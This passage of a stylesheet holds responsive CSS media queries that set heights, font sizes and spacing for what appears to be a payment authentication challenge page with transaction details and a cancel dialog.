                    min-height: 51%;
                }
                .challenge-info-text {
                    padding: 0 2%;
                }
            }
            @media screen and (min-width: 1180px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 49%;
                }
                .container-body-Channel-enclose {
                    margin-left: 24%;
                }
            }
            @media screen and (min-width: 1300px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-width: 1370px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-width: 1430px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-width: 1495px) {
                .challenge-zone {
                    min-height: 45%;
                }
                .challenge-info-text {
                    padding: 0% 2%;
                }
                .container-body-Channel-enclose {
                    margin-left: 25%;
                }
            }
            @media screen and (min-width: 1560px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }
            @media screen and (min-width: 1620px) {
                .challenge-zone {
                    min-height: 43%;
                }
            }
            @media screen and (min-width: 1685px) {
                .challenge-zone {
                    min-height: 42%;
                }
            }
            @media screen and (min-width: 1750px) {
                .challenge-zone {
                    min-height: 41%;
                }
            }
            @media screen and (min-width: 1810px) {
                .challenge-zone {
                    min-height: 40%;
                }
            }
            @media screen and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 39%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 45%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 43%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 42%;
                }
            }

            @media screen and (min-height: 500px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 45%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 43%;
                }
            }

            @media screen and (min-height: 540px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 62%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 45%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }

            @media screen and (min-height: 600px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 63%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 62%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-height: 600px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 45%;
                }
            }

            @media screen and (min-height: 690px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 64%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 63%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 690px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }

            @media screen and (min-height: 820px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 65%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 64%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 62%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 820px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }

            @media screen and (min-height: 1025px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 66%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 65%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 63%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 62%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 1025px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 500px) {
                .cancelTxn-div-info-msg {
                    height: 55%;
                }
                .challenge-info-header-h3 {
                    line-height: 30px;
                }
                .challenge-info-sub-header {
                    line-height: 22px;
                }
                .header-zone {
                    height: 4%;
                    padding: 1% 7% 1% 7%;
                }
            }
            @media screen and (min-height: 600px) {
                .cancelTxn-div-msg {
                    height: 80%;
                }
                .cancelTxn-div-info-msg {
                    height: 60%;
                }
                .challenge-info-header-h3 {
                    line-height: 30px;
                }
                .challenge-info-sub-header {
                    line-height: 30px;
                }
            }
            @media screen and (min-height: 700px) {
                .cancelTxn-div-info-msg {
                    height: 70%;
                }
                .challenge-info-header-h3 {
                    line-height: 40px;
                }
                .challenge-info-sub-header {
                    line-height: 30px;
                }
            }
            @media screen and (min-height: 800px) {
                .cancelTxn-div-info-msg {
                    height: 75%;
                }
            }
            @media screen and (min-height: 900px) {
                .cancelTxn-div-msg {
                    height: 85%;
                }
                .cancelTxn-div-info-msg {
                    height: 80%;
                }
            }

            /*landing auth*/

            @media screen and (max-width: 400px) {
                .challenge-info-header-h3 {
                    font-size: 16px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 11px;
                }
                .challenge-info-sub-header {
                    font-size: 13px;
                }
                #displayText {
                    font-size: 11px;
                }
                .hidetext-span {
                    font-size: 10px;
                }
                .hidetext1-span {
                    font-size: 10px;
                }
            }
            @media screen and (min-width: 401px) and (max-width: 600px) {
                .challenge-info-header-h3 {
                    font-size: 16px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 12px;
                }
                .challenge-info-sub-header {
                    font-size: 14px;
                }
                #displayText {
                    font-size: 12px;
                }
                .hidetext-span {
                    font-size: 11px;
                }
                .hidetext1-span {
                    font-size: 11px;
                }
            }
            @media screen and (min-width: 601px) and (max-width: 1000px) {
                .challenge-info-header-h3 {
                    font-size: 17px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 13px;
                }
                .challenge-info-sub-header {
                    font-size: 15px;
                }
                #displayText {
                    font-size: 13px;
                }
                .hidetext-span {
                    font-size: 11px;
                }
                .hidetext1-span {
                    font-size: 13px;
                }
            }
            @media screen and (min-width: 1001px) {
                .challenge-info-header-h3 {
                    font-size: 19px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 15px;
                }
                .challenge-info-sub-header {
                    font-size: 17px;
                }
                #displayText {
                    font-size: 15px;
                }
                .hidetext-span {
                    font-size: 14px;
                }
                .hidetext1-span {
                    font-size: 14px;
                }
            }
            @media screen and (min-height: 500px) {
                .challenge-info-header-h3 {
                    line-height: 30px;
                }
                .challenge-info-sub-header {
                    line-height: 22px;
                }
                .header-zone {
                    height: 4%;
                    padding: 1% 7% 1% 7%;
                }
            }
            @media screen and (min-height: 600px) {
                .challenge-info-header-h3 {
                    line-height: 35px;
                }
                .challenge-info-sub-header {
                    line-height: 30px;
                }
            }
            @media screen and (min-height: 700px) {
                .challenge-info-header-h3 {
                    line-height: 40px;
                }
                .challenge-info-sub-header {
                    line-height: 30px;
                }
            }
            @media screen and (min-width: 340px) {
                .lang-section select,
                .lang-section select option,
                .secondary-btn a {
                    font-size: 12px;
                }
                .authentication-confirmation {
                    height: 40%;
                }
                .container-body-ChannelSelect {
                    width: 300px;
                }
                .container-body-Channel-enclose {
                    margin: 0 37.5px;
                }
                .container-body-Channel-a {
                    line-height: 1.5;
                    font-size: 11px;
                }
                .cancelTxn-div {
                    height: auto;
                    width: 60%;
                }
                .cancelTxn-div h3 {
                    font-size: 15px;
                }
                .cancelTxn-div p {
                    font-size: 11px;
                }
                .cancelTxn-input-btn,
                .cancelTxn-submit {
                    max-width: 160px;
                    font-size: 10px;
                }
            }
            @media screen and (min-width: 400px) and (min-height: 400px) {
                .container-body-Channel-enclose {
                    margin: 0 45px;
                    height: 85px;
                    width: 85px;
                }
                .container-body-Channel {
                    height: 80px;
                    width: 80px;
                }
                .container-body-ChannelSelect {
                    width: 350px;
                }
            }
            @media screen and (min-width: 400px) {
                /* .card-brand-logo {
        padding: 1.5% 0 1.5% 5%;
    } */
                .header-zone {
                    width: 90%;
                    padding: 0.5% 5% 0.5% 5%;
                }
                .branding-zone {
                    width: 90%;
                    padding: 1% 5% 0.5% 5%;
                }
                .challenge-zone {
                    width: 90%;
                    padding: 1% 5% 1% 5%;
                }
                .container-footer {
                    width: 90%;
                    padding: 1% 5% 1% 5%;
                }
                .challenge-info-sub-header {
                    padding: 2% 2% 0% 2%;
                }
            }
            @media screen and (min-width: 485px) {
                /* .card-brand-logo {
        padding: 1.5% 0 1.5% 5%;
    } */
                .header-zone {
                    width: 92%;
                    padding: 0.5% 4% 0.5% 4%;
                }
                .branding-zone {
                    width: 92%;
                    padding: 1% 4% 0.5% 4%;
                }
                .challenge-zone {
                    width: 92%;
                    padding: 1% 4% 1% 4%;
                }
                .container-footer {
                    width: 92%;
                    padding: 1% 4% 1% 4%;
                }
            }
            @media screen and (min-width: 600px) {
                .lang-section select,
                .lang-section select option,
                .secondary-btn a {
                    font-size: 13px;
                }
                /* .card-brand-logo {
        padding: 1% 0 1% 5%;
    } */
                .cancelTxn-div {
                    height: auto;
                    width: 50%;
                }
                .cancelTxn-div h3 {
                    font-size: 17px;
                }
                .cancelTxn-div p {
                    font-size: 13px;
                }
                .cancelTxn-input-btn,
                .cancelTxn-submit {
                    max-width: 200px;
                    font-size: 13px;
                }
            }
            @media screen and (min-width: 1000px) {
                /* .card-brand-logo {
        padding: 0.5% 0 0.5% 5%;
    } */
                .cancelTxn-div {
                    height: auto;
                    width: 40%;
                }
            }
            @media screen and (min-height: 600px) {
                .container-footer {
                    min-height: 11%;
                }
            }
            @media screen and (min-width: 285px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 64%;
                }
            }
            @media screen and (min-width: 350px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 63%;
                }
            }
            @media screen and (min-width: 410px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 62%;
                }
            }
            @media screen and (min-width: 470px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-width: 530px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-width: 595px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-width: 300px) and (min-height: 500px) {
                .challenge-zone {
                    min-height: 65%;
                }
            }
            @media screen and (min-width: 440px) and (min-height: 500px) {
                .challenge-zone {
                    min-height: 64%;
                }
            }
            @media screen and (min-width: 520px) and (min-height: 500px) {
                .challenge-zone {
                    min-height: 63%;
                }
            }

            @media screen and (min-width: 250px) and (min-height: 600px) {
                .challenge-zone {
                    min-height: 71%;
                }
            }
            @media screen and (min-width: 300px) and (min-height: 600px) {
                .challenge-zone {
                    min-height: 70%;
                }
            }
            @media screen and (min-width: 380px) and (min-height: 600px) {
                .challenge-zone {
                    min-height: 69%;
                }
            }
            @media screen and (min-width: 490px) and (min-height: 600px) {
                .challenge-zone {
                    min-height: 69%;
                }
            }
            @media screen and (min-width: 535px) and (min-height: 600px) {
                .challenge-zone {
                    min-height: 68%;
                }
            }

            @media screen and (min-width: 675px) {
                .challenge-zone {
                    min-height: 58%;
                }
                .challenge-info-header-h3 {
                    padding: 1%;
                }
                .container-body-ChannelSelect {
                    width: 500px;
                }
                .container-body-Channel-enclose {
                    height: 95px;
                    width: 95px;
                    margin: 0 75px;
                }
                .container-body-Channel {
                    height: 90px;
                    width: 90px;
                }
                .container-body-Channel-a {
                    font-size: 12px;
                    line-height: 1.5;
                }
                /* .container-body-ChannelSelect{
        width: 400px;
    }
    .container-body-Channel-enclose {
        height: 85px;
        width: 85px;
        margin: 0 57.5px;
    }
    .container-body-Channel{
        height: 80px;
        width: 80px;
    }
    .container-body-Channel-a{
        font-size: 11px;
        line-height: 1.5;
    } */
                /* .container-body-Channel-enclose{
        margin-left: 21%;
    } */
            }
            @media screen and (min-width: 735px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-width: 800px) {
                .challenge-zone {
                    min-height: 56%;
                }
                /* .container-body-Channel-enclose{
        margin-left: 22%;
    } */
                .container-body-ChannelSelect {
                    width: 500px;
                }
                .container-body-Channel-enclose {
                    height: 95px;
                    width: 95px;
                    margin: 0 75px;
                }
                .container-body-Channel {
                    height: 90px;
                    width: 90px;
                }
                .container-body-Channel-a {
                    font-size: 12px;
                    line-height: 1.5;
                }
            }
            @media screen and (min-width: 860px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-width: 920px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-width: 990px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-width: 1050px) {
                .challenge-zone {
                    min-height: 52%;
                }
                /* .container-body-Channel-enclose{
        margin-left: 23%;
    } */
            }
            @media screen and (min-width: 1115px) {
                .challenge-zone {
                    min-height: 51%;
                }
                .challenge-info-text {
                    padding: 1% 2%;
                }
            }
            @media screen and (min-width: 1180px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 49%;
                }
                /* .container-body-Channel-enclose{
        margin-left: 24%;
    } */
            }
            @media screen and (min-width: 1300px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-width: 1370px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-width: 1430px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-width: 1495px) {
                .challenge-zone {
                    min-height: 45%;
                }
                .challenge-info-text {
                    padding: 1% 2%;
                }
                /* .container-body-Channel-enclose{
        margin-left: 25%;
    } */
            }
            @media screen and (min-width: 1560px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }
            @media screen and (min-width: 1620px) {
                .challenge-zone {
                    min-height: 43%;
                }
            }
            @media screen and (min-width: 1685px) {
                .challenge-zone {
                    min-height: 42%;
                }
            }
            @media screen and (min-width: 1750px) {
                .challenge-zone {
                    min-height: 41%;
                }
            }
            @media screen and (min-width: 1810px) {
                .challenge-zone {
                    min-height: 40%;
                }
            }
            @media screen and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 39%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 45%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 43%;
                }
            }
            @media screen and (min-height: 455px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 42%;
                }
            }
            @media screen and (min-height: 500px) {
                .challenge-info-header-h3 {
                    font-size: 18px;
                }
                .challenge-info-sub-header {
                    font-size: 15px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 13px;
                    line-height: 20px;
                }
                #displayText {
                    font-size: 13px;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 60%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 830px) {
                .challenge-zone {
                    min-height: 58%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 970px) {
                .challenge-zone {
                    min-height: 56%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1030px) {
                .challenge-zone {
                    min-height: 55%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1100px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1170px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1240px) {
                .challenge-zone {
                    min-height: 52%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1310px) {
                .challenge-zone {
                    min-height: 51%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1380px) {
                .challenge-zone {
                    min-height: 50%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1450px) {
                .challenge-zone {
                    min-height: 49%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1520px) {
                .challenge-zone {
                    min-height: 48%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1590px) {
                .challenge-zone {
                    min-height: 47%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1660px) {
                .challenge-zone {
                    min-height: 46%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1730px) {
                .challenge-zone {
                    min-height: 45%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1800px) {
                .challenge-zone {
                    min-height: 44%;
                }
            }
            @media screen and (min-height: 500px) and (min-width: 1870px) {
                .challenge-zone {
                    min-height: 43%;
                }
            }

            @media screen and (min-height: 540px) and (min-width: 610px) {
                .challenge-zone {
                    min-height: 62%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 675px) {
                .challenge-zone {
                    min-height: 61%;
                }
            }
            @media screen and (min-height: 540px) and (min-width: 755px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
